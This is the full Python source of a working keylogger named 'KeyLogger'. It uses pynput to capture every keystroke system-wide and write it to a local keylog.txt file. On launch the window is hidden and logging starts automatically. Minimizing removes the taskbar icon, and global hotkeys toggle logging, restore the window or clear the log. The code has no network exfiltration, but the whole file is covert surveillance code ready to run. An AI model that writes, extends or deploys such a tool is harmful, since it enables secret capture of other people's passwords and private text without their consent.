#!/usr/bin/env python3
"""
KeyLogger  -  Logs every key you type to a text file.
Requirements:  pip install pynput
Output saved to: keylog.txt  (next to this script)

Hotkeys:
  ALT+S   = start/stop logging toggle (global)
  ALT+L   = show/restore window (global)
  ALT+C   = clear log (global)
  Minimize = hides window + taskbar icon (use ALT+L to restore)
"""

import atexit, os, signal, sys, threading
import tkinter as tk

try:
    from pynput import keyboard as kb
    from pynput.keyboard import Key, KeyCode
except ImportError:
    print("Run:  pip install pynput")
    sys.exit(1)

# ── Paths ──────────────────────────────────────────────────────────────────────
if getattr(sys, "frozen", False):
    _BASE_DIR = os.path.dirname(sys.executable)
else:
    _BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LOG_FILE = os.path.join(_BASE_DIR, "keylog.txt")

# ── Colours ────────────────────────────────────────────────────────────────────
BG       = "#12121f"
PANEL    = "#1a1a2e"
ACCENT   = "#7c6af7"
RED      = "#e05c6a"
GREEN    = "#56d364"
TEXT     = "#e8e8f0"
MUTED    = "#6b6b8a"

FN  = ("Segoe UI", 10)
FNB = ("Segoe UI", 10, "bold")

# ── Key helpers ────────────────────────────────────────────────────────────────

def _norm(key):
    return {
        Key.alt_l: Key.alt,   Key.alt_r: Key.alt,
        Key.ctrl_l: Key.ctrl, Key.ctrl_r: Key.ctrl,
        Key.shift_l: Key.shift, Key.shift_r: Key.shift,
    }.get(key, key)

_ALTS  = frozenset([Key.alt,  KeyCode.from_char('s')])
_ALTL  = frozenset([Key.alt,  KeyCode.from_char('l')])
_ALTC  = frozenset([Key.alt,  KeyCode.from_char('c')])

# Special keys that produce readable text representations
_SPECIAL = {
    Key.space:     " ",
    Key.enter:     "\n",
    Key.backspace: "[BACKSPACE]",
    Key.tab:       "\t",
    Key.delete:    "[DELETE]",
    Key.esc:       "[ESC]",
    Key.caps_lock: "[CAPS]",
    Key.up:        "[UP]",
    Key.down:      "[DOWN]",
    Key.left:      "[LEFT]",
    Key.right:     "[RIGHT]",
    Key.home:      "[HOME]",
    Key.end:       "[END]",
    Key.page_up:   "[PGUP]",
    Key.page_down: "[PGDN]",
    Key.insert:    "[INS]",
    Key.f1:  "[F1]",  Key.f2:  "[F2]",  Key.f3:  "[F3]",  Key.f4:  "[F4]",
    Key.f5:  "[F5]",  Key.f6:  "[F6]",  Key.f7:  "[F7]",  Key.f8:  "[F8]",
    Key.f9:  "[F9]",  Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
}

# Modifiers we just silently skip (no text output)
_SILENT = {Key.alt, Key.ctrl, Key.shift, Key.cmd,
           Key.alt_gr, Key.num_lock, Key.scroll_lock, Key.pause}


# ══════════════════════════════════════════════════════════════════════════════
# Logger Engine
# ══════════════════════════════════════════════════════════════════════════════

class LoggerEngine:
    def __init__(self, on_state_change=None, on_show_window=None, on_clear_log=None):
        self.on_state_change = on_state_change
        self.on_show_window  = on_show_window
        self.on_clear_log    = on_clear_log
        self._logging    = False
        self._held: set  = set()
        self._fired      = set()   # tracks which combos have fired
        self._lock       = threading.Lock()

        self._kb = kb.Listener(on_press=self._on_kp, on_release=self._on_kr)
        self._kb.daemon = True
        self._kb.start()

        # Write session-end marker on ANY exit: crash, kill signal, power-off flush
        atexit.register(self._emergency_stop)
        for sig in (signal.SIGTERM, signal.SIGINT):
            try:
                signal.signal(sig, self._signal_handler)
            except (OSError, ValueError):
                pass  # Some signals can't be caught on all platforms

    @property
    def logging(self):
        return self._logging

    def start_logging(self):
        self._logging = True
        self._write_marker("=== Logging started ===\n")
        if self.on_state_change:
            self.on_state_change("logging")

    def stop_logging(self):
        self._logging = False
        self._write_marker("\n=== Logging stopped ===\n")
        if self.on_state_change:
            self.on_state_change("idle")

    def _emergency_stop(self):
        """Called by atexit or signal handler — writes a marker if logging was active."""
        if self._logging:
            self._logging = False
            self._write_marker("\n=== Session ended (forced/unexpected) ===\n")

    def _signal_handler(self, signum, frame):
        self._emergency_stop()
        sys.exit(0)

    def _toggle_logging(self):
        if self._logging:
            threading.Thread(target=self.stop_logging,  daemon=True).start()
        else:
            threading.Thread(target=self.start_logging, daemon=True).start()

    def _write_marker(self, text):
        try:
            with self._lock:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(text)
                    f.flush()
                    os.fsync(f.fileno())
        except Exception:
            pass

    def _write_key(self, text):
        try:
            with self._lock:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(text)
                    f.flush()
                    os.fsync(f.fileno())
        except Exception:
            pass

    def _check_combo(self, combo, tag):
        """Return True (and mark fired) if combo is active and not yet fired."""
        if combo <= self._held:
            if tag not in self._fired:
                self._fired.add(tag)
                return True
        return False

    def _on_kp(self, key):
        nk = _norm(key)
        self._held.add(nk)

        # ── Global hotkeys ────────────────────────────────────────────────────
        if self._check_combo(_ALTS, 'alts'):
            self._toggle_logging()
            return

        if self._check_combo(_ALTL, 'altl'):
            if self.on_show_window:
                self.on_show_window()
            return

        if self._check_combo(_ALTC, 'altc'):
            if self.on_clear_log:
                self.on_clear_log()
            return

        # ── Key logging ───────────────────────────────────────────────────────
        if not self._logging:
            return

        # Skip modifier-only keys
        if nk in _SILENT:
            return

        # Skip hotkey chars when Alt is held
        if Key.alt in self._held and nk in (
            KeyCode.from_char('s'), KeyCode.from_char('l'), KeyCode.from_char('c')
        ):
            return

        if nk in _SPECIAL:
            self._write_key(_SPECIAL[nk])
            return

        if isinstance(nk, KeyCode) and nk.char:
            self._write_key(nk.char)

    def _on_kr(self, key):
        nk = _norm(key)
        self._held.discard(nk)
        # Clear fired flags for any combo that no longer has all keys held
        if not (_ALTS  <= self._held): self._fired.discard('alts')
        if not (_ALTL  <= self._held): self._fired.discard('altl')
        if not (_ALTC  <= self._held): self._fired.discard('altc')


# ══════════════════════════════════════════════════════════════════════════════
# UI
# ══════════════════════════════════════════════════════════════════════════════

def btn(parent, text, cmd, color=ACCENT, fg="white"):
    return tk.Button(parent, text=text, command=cmd,
                     bg=color, fg=fg, font=FNB,
                     relief="flat", padx=14, pady=6,
                     activebackground=color, cursor="hand2")

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("KeyLogger")
        self.geometry("380x230")
        self.resizable(False, False)
        self.configure(bg=BG)

        # Hide from taskbar when minimized
        self.bind("<Unmap>", self._on_unmap)
        # Ensure atexit/emergency_stop runs when window is closed with X
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        self._engine = LoggerEngine(
            on_state_change=self._on_state,
            on_show_window=self._show_window,
            on_clear_log=self._clear,
        )
        self._build()
        # Start hidden — use ALT+L to show
        self.after(0, self.withdraw)
        # Auto-start logging on launch
        self.after(100, self._engine.start_logging)

    # ── Minimize → withdraw (removes taskbar icon) ────────────────────────────

    def _on_close(self):
        """X button or task-manager close — flush log then exit cleanly."""
        self._engine._emergency_stop()
        self.destroy()

    def _on_unmap(self, event):
        """Called when window is minimized — withdraw it fully."""
        if event.widget is self:
            # Small delay so Windows has time to process the minimize event
            self.after(10, self._do_withdraw)

    def _do_withdraw(self):
        self.withdraw()

    def _show_window(self):
        """Restore window — called from pynput thread, must use after()."""
        self.after(0, self._do_show)

    def _do_show(self):
        self.deiconify()
        self.lift()
        self.focus_force()

    # ── Build UI ──────────────────────────────────────────────────────────────

    def _build(self):
        # Header
        hdr = tk.Frame(self, bg=ACCENT)
        hdr.pack(fill="x")
        tk.Label(hdr, text="  KeyLogger", font=("Segoe UI", 13, "bold"),
                 bg=ACCENT, fg="white", pady=8).pack(side="left")

        # Status
        self._sv = tk.StringVar(value="Idle")
        sf = tk.Frame(self, bg=BG)
        sf.pack(pady=(18, 4))
        tk.Label(sf, text="Status: ", bg=BG, fg=MUTED, font=FN).pack(side="left")
        self._slbl = tk.Label(sf, textvariable=self._sv, bg=BG, fg=GREEN, font=FNB)
        self._slbl.pack(side="left")

        # Log file path
        tk.Label(self, text=f"Output: {LOG_FILE}",
                 bg=BG, fg=MUTED, font=("Segoe UI", 8),
                 wraplength=340).pack(pady=(0, 14))

        # Buttons
        bf = tk.Frame(self, bg=BG)
        bf.pack()
        self._rec_btn = btn(bf, "Start Logging", self._toggle, color=GREEN, fg="black")
        self._rec_btn.pack(side="left", padx=6)
        btn(bf, "Clear Log", self._clear, color="#555555").pack(side="left", padx=6)

        # Hotkey hints
        hints = tk.Frame(self, bg=BG)
        hints.pack(pady=(14, 0))
        for text in ("ALT+S = toggle logging",
                     "ALT+L = show/hide window",
                     "ALT+C = clear log"):
            tk.Label(hints, text=text, bg=BG, fg=MUTED,
                     font=("Segoe UI", 8)).pack()

    # ── Callbacks ─────────────────────────────────────────────────────────────

    def _on_state(self, state):
        colours    = {"idle": GREEN,  "logging": RED}
        labels     = {"idle": "Idle", "logging": "Logging..."}
        btn_labels = {"idle": "Start Logging", "logging": "Stop Logging"}
        btn_colors = {"idle": GREEN,  "logging": RED}
        def _upd():
            self._sv.set(labels.get(state, state))
            self._slbl.configure(fg=colours.get(state, TEXT))
            self._rec_btn.configure(
                text=btn_labels.get(state, "Toggle"),
                bg=btn_colors.get(state, ACCENT))
        self.after(0, _upd)

    def _toggle(self):
        if self._engine.logging:
            self._engine.stop_logging()
        else:
            self._engine.start_logging()

    def _clear(self):
        def _do():
            try:
                with open(LOG_FILE, "w", encoding="utf-8") as f:
                    f.write("")
            except Exception:
                pass
        self.after(0, _do)


if __name__ == "__main__":
    App().mainloop()
